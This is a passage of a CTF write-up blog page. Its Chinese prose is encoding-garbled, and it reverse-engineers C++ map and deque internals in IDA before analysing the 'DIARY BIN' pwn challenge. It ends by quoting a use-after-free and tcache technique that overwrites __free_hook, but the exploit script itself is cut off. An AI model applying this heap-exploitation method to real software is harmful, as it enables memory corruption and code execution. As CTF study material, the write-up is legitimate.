class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">std</span>::_Rb_tree&lt;...&gt;::_Rb_tree_impl _M_impl <span class="hljs-comment">//å³ä¸º_Rb_tree</span><br><span class="hljs-number">00000000</span> baseclass_0     <span class="hljs-built_in">std</span>::allocator&lt;...&gt; <span class="hljs-comment">//å°±å ç”¨ä¸€å­—èŠ‚</span><br><span class="hljs-number">00000001</span>                 db ? ; undefined<br><span class="hljs-number">00000002</span>                 db ? ; undefined<br><span class="hljs-number">00000003</span>                 db ? ; undefined<br><span class="hljs-number">00000004</span>                 db ? ; undefined<br><span class="hljs-number">00000005</span>                 db ? ; undefined<br><span class="hljs-number">00000006</span>                 db ? ; undefined<br><span class="hljs-number">00000007</span>                 db ? ; undefined<span class="hljs-comment">//æ„ä¹‰ä¸æ˜çš„å¯¹é½å¡«å……</span><br><span class="hljs-number">00000008</span> baseclass_8     <span class="hljs-built_in">std</span>::_Rb_tree_header ?<span class="hljs-comment">//è¿™ä¸ªç»“æ„ä½“å†…å®¹åœ¨ä¸‹é¢</span><br><span class="hljs-number">00000030</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_header       <span class="hljs-built_in">std</span>::_Rb_tree_node_base ? <span class="hljs-comment">//è¿˜æ˜¯åœ¨ä¸‹é¢</span><br><span class="hljs-number">00000020</span> _M_node_count   dq ?<br><span class="hljs-number">00000030</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_color        dd ?                    ; <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">std</span>:</span>:_Rb_tree_color<br><span class="hljs-number">00000004</span>                 dd ? ; undefined<br><span class="hljs-number">00000008</span> _M_parent       dq ?                    ; offset<br><span class="hljs-number">00000010</span> _M_left         dq ?                    ; offset<br><span class="hljs-number">00000018</span> _M_right        dq ?                    ; offset<br><span class="hljs-number">00000020</span><br></code></pre></div></td></tr></table></figure><p>æ‰€ä»¥å®é™…ä¸Šä¸º</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_color        dd ?                    ; <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">std</span>:</span>:_Rb_tree_color<br><span class="hljs-number">00000004</span>                 dd ? ; undefined<br><span class="hljs-number">00000008</span> _M_parent       dq ?                    ; offset<br><span class="hljs-number">00000010</span> _M_left         dq ?                    ; offset<br><span class="hljs-number">00000018</span> _M_right        dq ?                    ; offset<br><span class="hljs-number">00000020</span> _M_node_count   dq ?<br><span class="hljs-number">00000030</span> map_end<br></code></pre></div></td></tr></table></figure><p>å•Š, è¿˜æ˜¯æŸ¥IDAå¾—ç»“æ„ä½“æ–¹ä¾¿. æºç é‡ŒçœŸçš„æ˜¯æ‰¾åŠå¤©. </p><blockquote><p>å¼€å¤´çš„map classæ„é€ å‡½æ•°è¿˜é”™è¯¯çš„å°†mainçš„rsi rdxå½“æˆæ˜¯è¯¥å‡½æ•°çš„ç¬¬äºŒä¸‰ä¸ªå‚æ•°, æ²¡æœ‰ç¬¦å·æ—¶IDAå¯èƒ½ä¼šé”™è¯¯å¢åŠ å˜é‡ä¸ªæ•°. </p></blockquote><p>æ„é€ å‡½æ•°æ˜¯ä¸€å †å¥—å¨ƒå­å‡½æ•°, æ¸…ç©ºä¸‹59å­—èŠ‚(å¤§æ¦‚)å†…å­˜. </p><ul><li><p>ç„¶ååˆ†æä¸‹**operator[]**å‡½æ•°: æ³¨æ„åˆ°mapå˜é‡çš„æ“ä½œç¬¦æœ€ç»ˆä¼šè¢«ç¼–è¯‘æˆclassæˆå‘˜å‡½æ•°çš„æ ·å­, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºthisæŒ‡é’ˆ, ç¬¬äºŒä¸ªå‚æ•°ä¸ºç›¸åº”æ“ä½œæ•°å€¼. ä¾‹å¦‚<code>operator[]</code>çš„å¯¹åº”å‡½æ•°è¡¨è¾¾å¼ä¸º<code>*sub_28D4(m, fuckstr) = 1;</code>å³<code>map[&#39;fuck&#39;] = 666</code>. **åœ¨è¿™ä¸ªå‡½æ•°ä¸­å¯ä»¥å‘ç°<code>_Rb_tree_insert_and_rebalance</code>è¿™ä¸ªå‡½æ•°, ä¹Ÿèƒ½å¤Ÿç¡®å®šæ˜¯æŸä¸ªä½¿ç”¨é»‘çº¢æ ‘çš„å®¹å™¨. ** </p><p>sub_28d4è¿”å›çš„æ˜¯ä¸€ä¸ª<a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/stl_map.h#L488">å·¦å€¼å¼•ç”¨</a>, åœ¨C++11ä»¥åçš„ç‰ˆæœ¬ä¸­ä½¿ç”¨å³å€¼å¼•ç”¨å‚æ•°(åˆæŸ¥äº†åŠå¤©çš„å³å€¼å¤ä¹ äº†ä¸‹, ä¸»è¦æ˜¯é…åˆmoveå’Œforwardä¸¤ä¸ªå‡½æ•°å¥½ç”¨), åœ¨æºç ä¸­å°±æ˜¯è¿™ä¹ˆå‡ ä¸ªå‡½æ•°:</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">v5 = <span class="hljs-built_in">sub_2DD0</span>(a1, a2);<span class="hljs-comment">//lower_bound(), a1 = this*, v5 = __i</span><br>v6 = <span class="hljs-built_in">sub_2DF6</span>(a1);<span class="hljs-comment">//end()</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_2E10</span>(&amp;v5, &amp;v6) || (<span class="hljs-built_in">sub_2E32</span>(a1), v2 = <span class="hljs-built_in">sub_2E4E</span>(&amp;v5), <span class="hljs-built_in">sub_2E6C</span>(&amp;v7, a2, v2)) )       <br>&#123;<br>  <span class="hljs-built_in">sub_2E96</span>(v9, a2);<br>  <span class="hljs-built_in">sub_2EBC</span>(&amp;v10, &amp;v5);<br>  v5 = <span class="hljs-built_in">sub_2EDA</span>(a1, v10, &amp;unk_6004, v9, &amp;v8);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_2E4E</span>(&amp;v5) + <span class="hljs-number">32</span>;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">iterator __i = <span class="hljs-built_in">lower_bound</span>(__k);<br><span class="hljs-comment">// __i-&gt;first is greater than or equivalent to __k.</span><br><span class="hljs-keyword">if</span> (__i == <span class="hljs-built_in">end</span>() || <span class="hljs-built_in">key_comp</span>()(__k, (*__i).first))<br>  __i = _M_t._M_emplace_hint_unique(__i, std::piecewise_construct,<br>std::forward_as_tuple(std::<span class="hljs-built_in">move</span>(__k)),<br>std::tuple&lt;&gt;());<br><span class="hljs-keyword">return</span> (*__i).second;<br></code></pre></div></td></tr></table></figure><ul><li>ç„¶è€Œæ²¡ç¬¦å·çš„**<code>map::find</code>**çœŸçš„çœ‹ä¸å‡ºæ¥ä»€ä¹ˆç«¯å€ªâ€¦.</li><li>å†çœ‹çœ‹treeçš„<strong>iterator</strong>, å®ƒçš„å†…å­˜å¸ƒå±€å¾ˆç®€å•, åªæœ‰ä¸€ä¸ª<code>_Rb_tree_node_base*</code>æŒ‡é’ˆå ç”¨8å­—èŠ‚. åœ¨è°ƒç”¨<code>map::end()</code>æ—¶å°±å¯ä»¥ç®€å•åœ°çœ‹å‡ºæ¥. </li><li>findå‡½æ•°å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”é”®å€¼å¯¹åˆ™è¿”å›iter_end. </li><li>mapçš„eraseä¸­å¯¹valueçš„ç©ºé—´è¿›è¡Œäº†destroy, æ„å‘³ç€è°ƒç”¨äº†ç±»(å¦‚æœæ˜¯çš„è¯)çš„ææ„å‡½æ•°. </li></ul><blockquote><p>ç„¶åæ˜¯çœ‹äº†æºç åçš„åˆ†æ</p></blockquote><ul><li>ä¹Ÿæ²¡å•¥, mapè¦å®ç°çš„æ“ä½œåœ¨rb_treeä¸­éƒ½æœ‰å®ç°, æ‰€ä»¥åšä¸€ä¸ªè½¬æ¥è°ƒç”¨å³å¯. </li><li>æ³¨æ„åˆ°æºç ä¸­çš„rb_treeè¿˜ç»§æ‰¿äº†ä¸€ä¸ªbaseç„¶è€Œä¹¦ä¸­æ²¡æœ‰, åªæœ‰ä¸€ä¸ªnode_base. </li><li></li></ul><h4 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h4><blockquote><p>è¶³è¶³æœ‰80å­—èŠ‚. </p></blockquote><p>å¸ƒå±€å¦‚ä¸‹: </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-number">00000000</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x50</span>, align=<span class="hljs-number">0x8</span>, copyof_137)<br><span class="hljs-number">00000000</span>                                         ; XREF: std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;/r<br><span class="hljs-number">00000000</span> _M_map          dq ?                    ; offset<br><span class="hljs-number">00000008</span> _M_map_size     dq ?<br><span class="hljs-number">00000010</span> <span class="hljs-number">16</span> _M_start        std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ? <br><span class="hljs-number">00000030</span> <span class="hljs-number">48</span> _M_finish       std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ?<br><span class="hljs-number">00000050</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl ends<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­start finishæ„æ€æ˜¾è€Œæ˜“è§. ä½†æ˜¯æ³¨æ„åˆ°ä¸€ä¸ªiteratoræœ‰0x20å­—èŠ‚, å’Œvectorçš„8å­—èŠ‚æ˜æ˜¾ä¸åŒ. ä¸‹é¢æ˜¯iterator:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-number">00000000</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x20</span>, align=<span class="hljs-number">0x8</span>, copyof_139)<br><span class="hljs-number">00000000</span>                                         ; XREF: std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl/r<br><span class="hljs-number">00000000</span> st fi                                   ; std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl/r<br><span class="hljs-number">00000000</span> <span class="hljs-number">16</span> <span class="hljs-number">48</span> _M_cur          dq ?                    ; offset<br><span class="hljs-number">00000008</span> <span class="hljs-number">24</span> <span class="hljs-number">56</span> _M_first        dq ?                    ; offset<br><span class="hljs-number">00000010</span> <span class="hljs-number">32</span> <span class="hljs-number">64</span> _M_last         dq ?                    ; offset<br><span class="hljs-number">00000018</span> <span class="hljs-number">40</span> <span class="hljs-number">72</span> _M_node         dq ?                    ; offset<br><span class="hljs-number">00000020</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ends<br></code></pre></div></td></tr></table></figure><p>å¤šäº†first last node. </p><p>æ³¨æ„æŒ‡é’ˆçš„ä½ç½®, curæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ æˆ–è€…<strong>æœ€åä¸€ä¸ªå…ƒç´ ä¹‹å</strong>. </p><img src="../../image/recent_ctf/image-20230124221604604.png" alt="image-20230124221604604" style="zoom:80%;" /><img src="../../image/recent_ctf/image-20230125112558204.png" alt="image-20230125112558204" style="zoom:80%;" /><ul><li><p>å®ƒçš„è¿­ä»£å™¨æ¯”è¾ƒç›´æ¥. é€†å‘è¿­ä»£å¦‚ä¸‹, å¦‚æœæ˜¯æ­£å‘è¿­ä»£åˆ™åªè¦ç¬¬äº”è¡Œå³å¯. ç›´æ¥åˆå§‹åŒ–<code>*__x = this-&gt;_M_impl._M_finish</code> </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">std::deque&lt;<span class="hljs-keyword">int</span>&gt;::reverse_iterator *__cdecl std::deque&lt;<span class="hljs-keyword">int</span>&gt;::<span class="hljs-built_in">rbegin</span>(std::deque&lt;<span class="hljs-keyword">int</span>&gt;::reverse_iterator *retstr, std::deque&lt;<span class="hljs-keyword">int</span>&gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>)<br>&#123;<br>  std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&amp;,<span class="hljs-keyword">int</span>*&gt; __x; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span> &amp;,<span class="hljs-keyword">int</span> *&gt;::_Deque_iterator(&amp;__x, &amp;<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish);<br>  std::reverse_iterator&lt;std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span> &amp;,<span class="hljs-keyword">int</span> *&gt;&gt;::<span class="hljs-built_in">reverse_iterator</span>(retstr, &amp;__x);<br>  <span class="hljs-keyword">return</span> retstr;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>å®ƒçš„push_back-&gt;move+emplace_back. æ³¨æ„emplaceçš„å‚æ•°æ˜¯std::moveçš„è¿”å›å€¼, moveå®é™…ä¸Šå•¥ä¹Ÿæ²¡åš. push_frontéå¸¸ç›¸ä¼¼.<br>ç¬¬ä¸€æ¬¡æˆ‘è¿˜æ˜¯çœ‹åˆ°äº†<code>_M_push_back_aux</code>ä¸­çš„ä¸€ä¸ªæŠ¥é”™å­—ç¬¦ä¸²æ‰å‘ç°è¿™ä¸ªæ˜¯deque. </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">void</span> __fastcall std::deque&lt;<span class="hljs-keyword">int</span>&gt;::emplace_back&lt;<span class="hljs-keyword">int</span>&gt;(std::deque&lt;<span class="hljs-keyword">int</span>&gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *__args_0)<br>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> *v4; <span class="hljs-comment">// r9</span><br>  <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// r8</span><br>  <span class="hljs-comment">// +48 == +64</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur == <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_last - <span class="hljs-number">1</span> )<br>  &#123; <span class="hljs-comment">// if space is not enough</span><br>    v5 = std::forward&lt;<span class="hljs-keyword">int</span>&gt;(a2); <br>    std::deque&lt;<span class="hljs-keyword">int</span>&gt;::_M_push_back_aux&lt;<span class="hljs-keyword">int</span>&gt;(<span class="hljs-keyword">this</span>, v5, v6); <br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v3 = std::forward&lt;<span class="hljs-keyword">int</span>&gt;(a2);<br>    std::allocator_traits&lt;std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::construct&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt;(<br>      <span class="hljs-keyword">this</span>,<br>      <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur,<br>      v3,<br>      v4); <span class="hljs-comment">//v4æ˜¯å¯å˜å‚æ•°åˆ—è¡¨å¯¼è‡´çš„</span><br>    ++<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>erase: ä¸€ä¸ªif, ä¸€ä¸ªelseè¯­å¥è¿˜æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„, è¦æ³¨æ„æœ‰ä¸¤å±‚wrap, å’Œvectorå·®ä¸å¤š. è¿˜æœ‰ä¸€ä¸ªé‡è½½ç‰ˆæœ¬æ˜¯æ“¦é™¤åŒºé—´.<br>æœ‰è¶£çš„æ˜¯å®ƒä¼šæ ¹æ®è¦æ“¦é™¤å…ƒç´ çš„ä½ç½®å·¦å³å…ƒç´ ä¸ªæ•°æ¥å†³å®šç§»åŠ¨å·¦è¾¹æˆ–è€…å³è¾¹, ä¹Ÿå°±æ˜¯ä¸‹é¢ifå’Œelseçš„é€»è¾‘.<br>ä¸è¿‡æœ‰ä¸€æ ·çš„é—®é¢˜, ä¼šå¯¹frontæˆ–è€…end(æ ¹æ®æ‰§è¡Œçš„æ˜¯ifè¿˜æ˜¯elseè¯­å¥)æ‰§è¡Œ<code>destroy()</code> </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br><span class="hljs-keyword">typename</span> deque&lt;_Tp, _Alloc&gt;::iterator<br>deque&lt;_Tp, _Alloc&gt;::<br>_M_erase(iterator __position)<br>&#123;<br>iterator __next = __position;<br>++__next;<br><span class="hljs-keyword">const</span> difference_type __index = __position - <span class="hljs-built_in">begin</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">static_cast</span>&lt;size_type&gt;(__index) &lt; (<span class="hljs-built_in">size</span>() &gt;&gt; <span class="hljs-number">1</span>))<br>&#123;<br><span class="hljs-keyword">if</span> (__position != <span class="hljs-built_in">begin</span>())<br>_GLIBCXX_MOVE_BACKWARD3(<span class="hljs-built_in">begin</span>(), __position, __next);<br><span class="hljs-built_in">pop_front</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (__next != <span class="hljs-built_in">end</span>())<br>_GLIBCXX_MOVE3(__next, <span class="hljs-built_in">end</span>(), __position);<br><span class="hljs-built_in">pop_back</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">begin</span>() + __index;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>pop_back(): æ³¨æ„åˆ°destroyå¯¹äºåŸç”Ÿç±»å‹æ˜¯æ²¡æœ‰æ“ä½œçš„, çœ‹åˆ°å•¥ä¹Ÿæ²¡è¿”å›çš„ä¸è¦æƒŠè®¶. </p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop_back</span><span class="hljs-params">()</span> _GLIBCXX_NOEXCEPT</span><br><span class="hljs-function"></span>&#123;<br>    __glibcxx_requires_nonempty();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur<br>        != <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_first)<br>    &#123;<br>        --<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur;<br>        _Alloc_traits::<span class="hljs-built_in">destroy</span>(<span class="hljs-keyword">this</span>-&gt;_M_impl,<br>            <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        _M_pop_back_aux();<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="DIARY-BIN"><a href="#DIARY-BIN" class="headerlink" title="DIARY BIN"></a>DIARY BIN</h3><p>å›åˆ°é¢˜ç›®ä¸­. </p><ul><li><p>sub_2813æ˜¯initå‡½æ•°. å‘ä¸€ä¸ªå…¨å±€mapæ·»åŠ å‡ ä¸ªé”®å€¼å¯¹, ä½†æ˜¯åœ¨æºç ä¸­çœ‹åˆ°å€¼æ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹, è¦ç•™æ„è¿™ç§å¯èƒ½. </p></li><li><p>é‡åˆ°äº†å˜é‡é‡å¤ä½¿ç”¨, ifè¯­å¥å†…å¤–å·²ç»ä¸æ˜¯ä¸€ä¸ªå«ä¹‰äº†. </p></li><li><p>ä¸‹é¢çš„strtolæ˜¯é”™è¯¯çš„, å®é™…ä¸Šæ˜¯<code>stoi</code>, åº“å‡½æ•°APIå¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">stoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> string&amp; __str, <span class="hljs-keyword">size_t</span>* __idx = <span class="hljs-number">0</span>, <span class="hljs-keyword">int</span> __base = <span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">//__stoa is helper for all sto* functions</span><br>    <span class="hljs-keyword">return</span> __gnu_cxx::__stoa&lt;<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>&gt;(&amp;std::strtol, <span class="hljs-string">&quot;stoi&quot;</span>, __str.<span class="hljs-built_in">c_str</span>(),<br>                                        __idx, __base); &#125;<br></code></pre></div></td></tr></table></figure></li><li></li></ul><p>åˆ†æ”¯åˆ†æ:</p><ul><li>op_add<ul><li><code>add format: add#year#month#day#hour#minutes#second#content</code> </li><li>diary_vectorå­˜å‚¨æ—¥è®°, æœ€å¤š32ä¸ª. æ—¶é—´é™åˆ¶ä¸º2022å¹´ä»¥å‰. åˆ†é…0x300çš„ç©ºé—´, contentæœ€å¤šå†™å…¥0x2F0. </li><li>newå‡ºæ¥çš„contentå¦‚æœå‰å››ä¸ªå­—ç¬¦éƒ½æ˜¯ç©ºæ ¼åˆ™åˆdeleteæ‰. ç„¶ååœ¨åˆä¸€æ¬¡çš„initä¸­newå‡ºä¸€ç‰‡contentç©ºé—´, <strong>æ¸…é›¶å¹¶è®¾ç½®å‰å››å­—èŠ‚ä¸ºç©ºæ ¼</strong>. </li></ul></li><li>op_update<ul><li><code>update format: update#idx#content</code> </li><li>memsetè¿‡ç¨‹å’Œop_addåŸºæœ¬ä¸€è‡´. idxåˆ¤æ–­é€»è¾‘æ˜¯ä¸èƒ½å¤§äºvectoré•¿åº¦. </li></ul></li><li>op_show<ul><li><code>show format: show#idx</code> æ²¡å•¥ç‰¹åˆ«çš„</li></ul></li><li>op_delete<ul><li>æ ¼å¼å°±æ˜¯deleteåŠ ä¸Šidx. </li></ul></li><li>op_encrypt<ul><li><code>encrypt format: encrypt#idx#offset#lengt</code> </li><li><del>ä½¿ç”¨<code>strtol()</code>ä½†æ˜¯è¿”å›çš„æ•°å€¼èµ‹å€¼ç»™äº†unsigned intç±»å‹, å¯èƒ½æº¢å‡º. å¥½å§å¥½å‡ ä¸ªå‡½æ•°éƒ½æ˜¯è¿™æ ·çš„</del>.<br>ä¸è¿‡offset &lt; content_len, len &gt; content_len, len + offset &gt; content_len. </li><li>ç”¨idxå¯¹åº”çš„diaryçš„datetimeåœ¨<code>time_cry_map</code>é‡Œæ‰¾åˆ°æ˜ å°„çš„<code>diary_cry_vec</code>, ç„¶åå°†å…·æœ‰offset length content(<strong>by calloc</strong>)ä¸‰ä¸ªfieldçš„ç»“æ„ä½“pushbackåˆ°<code>diary_cry_vec</code>, ä½œä¸ºåŸå§‹æ•°æ®, å†å°†åŸåŒºåŸŸçš„æ•°æ®è¿›è¡Œbyte xor, å­—èŠ‚åºåˆ—ä¸ºç¨‹åºä¸€å¼€å§‹å¾—åˆ°çš„éšæœºæ•°å­—èŠ‚ä¸², è®¾ç½®encrypted bit in diary struct. </li></ul></li><li>decrypt<ul><li><code>decrypt#idx</code> </li><li>æ ¹æœ¬æ²¡è§£, åœ¨forå¾ªç¯é‡Œé¢æŠŠvectorçš„æ¯ä¸€ä¸ªå…ƒç´ éƒ¨åˆ†éƒ½memcpyå›å». è¿™?</li></ul></li></ul><p>è¿™åˆæœ‰ä»€ä¹ˆæ¼æ´?? å±…ç„¶å¯ä»¥æ˜¯vector::eraseçš„ç‰¹æ€§â€¦.</p><p>ç›´æ¥wpå­¦ä¹ æ³•(åˆ°åº•ä»€ä¹ˆæ—¶å€™æ‰èƒ½è‡ªå·±åšé¢˜å•Š)</p><h3 id="wp1-Nu1l"><a href="#wp1-Nu1l" class="headerlink" title="wp1 - Nu1l"></a>wp1 - Nu1l</h3><blockquote><p>åˆ©â½¤UAFæ„é€ æœ€åâ¼€ä¸ªå—åŒæ—¶å­˜åœ¨äºtcacheä¸unsorted binä¸­<br>å†åˆ©â½¤encçš„callocå†™â¼Šï¼Œä¿®æ”¹nextæŒ‡é’ˆä¸ºfree_hook</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 